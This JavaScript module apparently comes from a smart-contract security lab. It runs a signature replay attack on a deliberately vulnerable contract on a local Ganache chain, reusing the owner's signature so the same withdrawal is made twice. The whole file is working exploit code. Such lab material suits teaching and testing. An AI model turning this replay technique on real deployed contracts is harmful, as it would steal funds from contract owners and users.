import Web3 from 'web3';
import fs from 'fs';

const launchSigReplayAttack = async (_, options) => {
    const web3 = new Web3('http://ganache:8545');
    const accounts = await web3.eth.getAccounts();
    const chainId = await web3.eth.getChainId();

    const abi = JSON.parse(fs.readFileSync('./artifacts/Vulnerable2SigreplayABI.json'));
    let contractAddress = options.attack;

    if (!contractAddress) {
        const contractMap = JSON.parse(fs.readFileSync('./config/contracts-map.json'));
        contractAddress = contractMap[String(chainId)]['Vulnerable2Sigreplay'];
    }

    const contract = new web3.eth.Contract(abi, contractAddress);
    const attacker = accounts[2];
    const owner = accounts[0];

    const amount = web3.utils.toWei('1', 'ether');
    const hash = web3.utils.soliditySha3({ t: 'address', v: attacker }, { t: 'uint256', v: amount });

    // Signature (Ethereum signed message prefix is handled internally)
    const signature = await web3.eth.sign(hash, owner);

    // Initial balance
    const balanceBefore = await web3.eth.getBalance(attacker);
    console.log("💰 Attacker balance before:", web3.utils.fromWei(balanceBefore, 'ether'), "ETH");

    // First withdraw
    await contract.methods.withdraw(attacker, amount, signature).send({
        from: attacker,
        gas: 100000
    });
    console.log("[1] First withdraw executed.");

    // Replay the same signature
    await contract.methods.withdraw(attacker, amount, signature).send({
        from: attacker,
        gas: 100000
    });
    console.log("[2] Second withdraw (replay) executed.");

    const balanceAfter = await web3.eth.getBalance(attacker);
    console.log("💰 Attacker balance after:", web3.utils.fromWei(balanceAfter, 'ether'), "ETH");
};

export default launchSigReplayAttack;
